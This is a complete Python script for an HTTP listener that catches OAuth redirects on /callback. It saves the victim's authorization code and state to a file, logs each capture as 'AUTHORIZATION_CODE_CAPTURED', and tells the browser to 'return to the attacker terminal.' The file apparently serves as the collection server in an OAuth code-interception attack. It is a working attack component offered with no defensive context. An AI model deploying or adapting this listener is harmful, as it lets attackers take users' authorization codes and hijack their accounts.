from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse, parse_qs
import json
import time
import os


LOG_DIR = os.path.expanduser("~/logs")
os.makedirs(LOG_DIR, exist_ok=True)


class CallbackHandler(BaseHTTPRequestHandler):

    def do_GET(self):
        parsed = urlparse(self.path)

        if parsed.path != "/callback":
            self.send_response(404)
            self.end_headers()
            return

        params = parse_qs(parsed.query)

        result = {
            "code": params.get("code", [None])[0],
            "state": params.get("state", [None])[0],
            "error": params.get("error", [None])[0],
            "received_at": int(time.time())
        }

        with open("/tmp/oauth_callback.json", "w") as file:
            json.dump(result, file, indent=2)

        if result["code"] and not result["error"]:
            log_path = os.path.join(LOG_DIR, "callback_activity.log")
            with open(log_path, "a") as file:
                file.write(
                    f"{result['received_at']} | AUTHORIZATION_CODE_CAPTURED\n"
                )

        self.send_response(200)
        self.send_header("Content-Type", "text/html")
        self.end_headers()

        self.wfile.write(
            b"<html><body><h2>Authorization response received.</h2>"
            b"<p>You may return to the attacker terminal.</p></body></html>"
        )

        print("Authorization response received.")
        print(json.dumps(result, indent=2))


server = HTTPServer(("0.0.0.0", 8000), CallbackHandler)

print("Callback listener running on port 8000...")
server.serve_forever()
